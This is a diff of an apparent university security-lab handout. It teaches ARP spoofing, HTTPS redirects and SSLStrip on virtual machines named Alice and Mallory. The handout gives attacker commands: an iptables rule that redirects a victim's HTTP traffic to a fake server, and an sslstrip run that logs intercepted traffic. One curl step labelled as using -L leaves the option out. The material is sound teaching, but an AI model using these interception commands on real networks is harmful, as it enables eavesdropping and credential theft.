@@ -31,47 +31,68 @@ Finally:
 
 In this part, rather than disrupting the communication between Alice and the Gateway, Mallory wants to setup a fake HTTP server pretending to be Mathlab. To do so, Mallory will first redirect HTTP messages to a fake server before spoofing the ARP messages.
 
-*As Mallory* (terminal 2), redirect HTTP traffic (port 80) to port 8080 (Mallory's fake server)
-
-```shell
-vagrant@mallory:~$ sudo bash -c "echo '1' > /proc/sys/net/ipv4/ip_forward"
-vagrant@mallory:~$ sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
-```
-
-*As Mallory* (terminal 2), start a fake HTTP server listening on port 8080
+*As Mallory* (terminal 1), start a fake HTTP server listening on port 8080
 
 ```shell
 vagrant@mallory:~$ cd /vagrant/mallory/fake_http
 vagrant@mallory:~$ python -m SimpleHTTPServer 8080
 ```
 
-*As Mallory* (terminal 1), broadcast spoofed ARP messages as done previously
+*As Mallory* (terminal 2), redirect HTTP traffic (coming from eth1 on port 80) to the fake HTTP server on Mallory's:
+
+```shell
+vagrant@mallory:~$ sudo bash -c "echo '1' > /proc/sys/net/ipv4/ip_forward"
+vagrant@mallory:~$ sudo iptables -t nat -A PREROUTING -p tcp -i eth1 --dport 80 -j DNAT --to-destination 10.0.1.102:8080
+```
+
+*As Mallory* (terminal 2), broadcast spoofed ARP messages as done previously
 
 Finally:
 
 - *As Alice*, test that Mathlab is now reachable (but is it really mathlab?)
 - *As Mallory*, use Wireshark to see the (fake) HTTP exchange
 
-## ARP Spoofing (fake HTTPS server)
+## Understanding HTTPS redirects
 
-How could Mallory setup the attack if Alice tries to connect to Mathlab using HTTPS?
+As you may have noticed, it is possible to browse `mathlab.utsc.utoronto.ca` using both HTTP and HTTPS. You can also use curl to show the differences.
+
+*As Alice*, use the `-v` option in curl to show the difference between HTTP abd HTTPS:
 
 ```shell
-vagrant@alice:~$ curl https://mathlab.utsc.utoronto.ca/
+vagrant@alice:~$ curl -v http://mathlab.utsc.utoronto.ca/
+vagrant@alice:~$ curl -v https://mathlab.utsc.utoronto.ca/
 ```
 
-## SSLStripping
+In practice, it is *strongly not recommended* to have the same content served with HTTP and HTTPS (see note about [mixed content](https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content)). Usually, the web server is configured to serve the content with HTTPS only. However, when someone uses HTTP, the server sends back a special HTTP response (HTTP Status Code 301: Moved Permanently) saying that the page has been relocated permanently to its HTTPS location. Conveniently, most web browsers follow this redirection automatically.
 
-In this part, rather than redirecting Alice to a fake HTTPS server, Mallory wants to relay traffic between Alice and Mathlab as a man-in-the-middle attack. The goal is to fool Alice into sending non-encrypted HTTPS requests to Mallory.
+As an example, we have setup `http://mathlab.utsc.utoronto.ca/courses/cscd27f16/assignment/02/server/` to work like this. If you open this page (in HTTP) on your browser, you should see that you are being redirected automatically to `https://mathlab...`.
 
-*As Mallory* (terminal 2), forward all HTTPS traffic to the SSLStrip proxy.
+*As Alice*, use the `-v` option in curl to show the HTTP redirect response:
+
+```shell
+vagrant@alice:~$ curl -v http://mathlab.utsc.utoronto.ca/courses/cscd27f16/assignment/02/server/
+```
+
+*As Alice*, use the `-L` option in curl to follow the HTTPS redirects automatically (like most of web browsers do):
+
+```shell
+vagrant@alice:~$ curl -v http://mathlab.utsc.utoronto.ca/courses/cscd27f16/assignment/02/server/
+```
+
+## SSLStripping attack
+
+The SSLStripping attack is a man-in-the-middle attack that aims at relaying messages between the victim and a web server. SSLStripping does not break the SSL tunnel that is resistant to man-in-the-middle attack however it works by intercepting the HTTPS redirects (sent in plaintext) to maintain an HTTP connection with the victim. Meanwhile, it sets up a connection with the server in HTTPS. Using that setup, the attacker can get all messages sent by the victim and all responses sent back from the server.
+
+*As Mallory* (terminal 1), start an SSLStrip proxy on port 8080:
 
 ```shell
 vagrant@mallory:~$ cd sslstrip-0.9
 vagrant@mallory:~$ python sslstrip.py -a -w log.txt -l 8080 -f
 ```
 
+*As Mallory* (terminal 2), broadcast spoofed ARP messages as done previously
+
 Finally:
 
-- *As Alice*, test that (real) Mathlab is now reachable with HTTPS
+- *As Alice*, test that `http://mathlab.utsc.utoronto.ca/courses/cscd27f16/assignment/02/server/` is now reachable with HTTP
 - *As Mallory*, open the file `log.txt` and see all HTTPS traffic
